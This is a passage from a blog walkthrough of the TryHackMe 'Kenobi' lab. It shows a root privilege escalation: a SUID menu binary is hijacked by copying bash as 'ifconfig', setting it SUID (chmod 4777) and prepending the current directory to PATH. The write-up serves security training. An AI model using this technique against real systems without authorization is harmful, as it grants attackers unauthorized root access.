<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607134822.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607134822.png" /></a></p>
<p>Running through all the options once, it seems pretty straightforward, so we'll need to figure out a way to abuse it.</p>
<div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span>/usr/bin/menu

<span class="go">***************************************</span>
<span class="go">1. status check</span>
<span class="go">2. kernel version</span>
<span class="go">3. ifconfig</span>
<span class="go">** Enter your choice :1</span>
<span class="go">HTTP/1.1 200 OK</span>
<span class="go">Date: Fri, 07 Jun 2024 18:48:27 GMT</span>
<span class="go">Server: Apache/2.4.18 (Ubuntu)</span>
<span class="go">Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT</span>
<span class="go">ETag: &quot;c8-591b6884b6ed2&quot;</span>
<span class="go">Accept-Ranges: bytes</span>
<span class="go">Content-Length: 200</span>
<span class="go">Vary: Accept-Encoding</span>
<span class="go">Content-Type: text/html</span>

<span class="gp">kenobi@kenobi:~$ </span>/usr/bin/menu

<span class="go">***************************************</span>
<span class="go">1. status check</span>
<span class="go">2. kernel version</span>
<span class="go">3. ifconfig</span>
<span class="go">** Enter your choice :2</span>
<span class="go">4.8.0-58-generic</span>
<span class="gp">kenobi@kenobi:~$ </span>/usr/bin/menu

<span class="go">***************************************</span>
<span class="go">1. status check</span>
<span class="go">2. kernel version</span>
<span class="go">3. ifconfig</span>
<span class="go">** Enter your choice :3</span>
<span class="go">eth0      Link encap:Ethernet  HWaddr 02:b9:3b:22:86:a7</span>
<span class="go">          inet addr:10.10.68.225  Bcast:10.10.255.255  Mask:255.255.0.0</span>
<span class="go">          inet6 addr: fe80::b9:3bff:fe22:86a7/64 Scope:Link</span>
<span class="go">          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1</span>
<span class="go">          RX packets:148597 errors:0 dropped:0 overruns:0 frame:0</span>
<span class="go">          TX packets:148174 errors:0 dropped:0 overruns:0 carrier:0</span>
<span class="go">          collisions:0 txqueuelen:1000</span>
<span class="go">          RX bytes:7005333 (7.0 MB)  TX bytes:9676051 (9.6 MB)</span>

<span class="go">lo        Link encap:Local Loopback</span>
<span class="go">          inet addr:127.0.0.1  Mask:255.0.0.0</span>
<span class="go">          inet6 addr: ::1/128 Scope:Host</span>
<span class="go">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span>
<span class="go">          RX packets:218 errors:0 dropped:0 overruns:0 frame:0</span>
<span class="go">          TX packets:218 errors:0 dropped:0 overruns:0 carrier:0</span>
<span class="go">          collisions:0 txqueuelen:1</span>
<span class="go">          RX bytes:16277 (16.2 KB)  TX bytes:16277 (16.2 KB)</span>
</code></pre></div>
<p>We can see when we run strings on the binary, that the actual commands that are being run are listed there. You'll also notice that they're not being called with absolute paths, so it might be possible to trick this binary into running something of our choosing. </p>
<p>To do this, I'm going to copy <code>/bin/bash</code> to my home directory, and then modify my <code>PATH</code> environment variable to tell the system to essentially "Look for everything HERE first...". </p>
<p>First, copy the <code>/bin/bash</code> binary to the home directory. </p>
<div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span>cp<span class="w"> </span>/bin/bash<span class="w"> </span>.
</code></pre></div>
<p>Then, we can confirm that the <code>bash</code> binary is present in the home directory now.</p>
<div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span>ls<span class="w"> </span>-la
<span class="go">total 1056</span>
<span class="go">drwxr-xr-x 5 kenobi kenobi    4096 Jun  7 13:55 .</span>
<span class="go">drwxr-xr-x 3 root   root      4096 Sep  4  2019 ..</span>
<span class="go">-rwxr-xr-x 1 kenobi kenobi 1037528 Jun  7 13:55 bash</span>
<span class="go">lrwxrwxrwx 1 root   root         9 Sep  4  2019 .bash_history -&gt; /dev/null</span>
<span class="go">-rw-r--r-- 1 kenobi kenobi     220 Sep  4  2019 .bash_logout</span>
<span class="go">-rw-r--r-- 1 kenobi kenobi    3771 Sep  4  2019 .bashrc</span>
<span class="go">drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .cache</span>
<span class="go">-rw-r--r-- 1 kenobi kenobi     655 Sep  4  2019 .profile</span>
<span class="go">drwxr-xr-x 2 kenobi kenobi    4096 Sep  4  2019 share</span>
<span class="go">drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh</span>
<span class="go">-rw-rw-r-- 1 kenobi kenobi      33 Sep  4  2019 user.txt</span>
<span class="go">-rw------- 1 kenobi kenobi     642 Sep  4  2019 .viminfo</span>
</code></pre></div>
<p>Since we're attempting to trick the application into running our binary instead of the one it's supposed to run, we need to change the name of the <code>bash</code> binary to <code>ifconfig</code></p>
<div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span>mv<span class="w"> </span>bash<span class="w"> </span>ifconfig
</code></pre></div>
<p>We also need to set the permissions on the copied <code>bash</code> binary to make sure that it doesn't drop privileges. </p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>chmod<span class="w"> </span><span class="m">4777</span><span class="w"> </span>ifconfig
</code></pre></div>
<p>Once we've done that, we can add the current working directory (<code>/home/kenobi</code> in my case) to the <code>PATH</code> environment variable. </p>
<div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</code></pre></div>
<p>Running the <code>/usr/bin/menu</code> binary again and selecting option 3 causes the application to run OUR version of <code>bash</code> and gives us a shell as root. </p>
<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240607140530.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240607140530.png" /></a></p>







  
  



  


  


  <form class="md-feedback" name="feedback" hidden>
    <fieldset>
      <legend class="md-feedback__title">
        Was this page helpful?
      </legend>
      <div class="md-feedback__inner">
        <div class="md-feedback__list">
          
            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
            </button>
          
            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
            </button>
          
        </div>
        <div class="md-feedback__note">
          
            <div data-md-value="1" hidden>
              
              
                
              
              
              
                
                
              
              Thanks for your feedback!
            </div>
          
            <div data-md-value="0" hidden>
              
              
                
              
              
              
                
                
              
              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
            </div>
          
        </div>
      </div>
    </fieldset>
  </form>


  <h2 id="__comments">Comments</h2>
  <!-- Insert generated snippet here -->
  <script src="https://giscus.app/client.js"
        data-repo="tomfieber/tomfieber.github.io"
        data-repo-id="R_kgDOPTkbBA"
        data-category="General"
        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        crossorigin="anonymous"
        async>
</script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    // Set palette on initial load
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate"
        ? "transparent_dark"
        : "light"

      // Instruct Giscus to set theme
      giscus.setAttribute("data-theme", theme) 
    }

    // Register event handlers after documented loaded
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate"
            ? "transparent_dark"
            : "light"

          // Instruct Giscus to change theme
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

      
    </article>
  </div>

          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
        
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../../05/18/tryhackme-annie.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: TryHackMe: Annie">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                TryHackMe: Annie
              </div>
            </div>
          </a>
        
        
          
          <a href="tryhackme-include.html" class="md-footer__link md-footer__link--next" aria-label="Next: TryHackMe: Include">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                TryHackMe: Include
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright © 2025 Tom Fieber
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
      
        <script src="../../../../javascripts/tablesort.js"></script>
      
        <script src="../../../../javascripts/extra.js"></script>
      
    
  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script></body>
</html>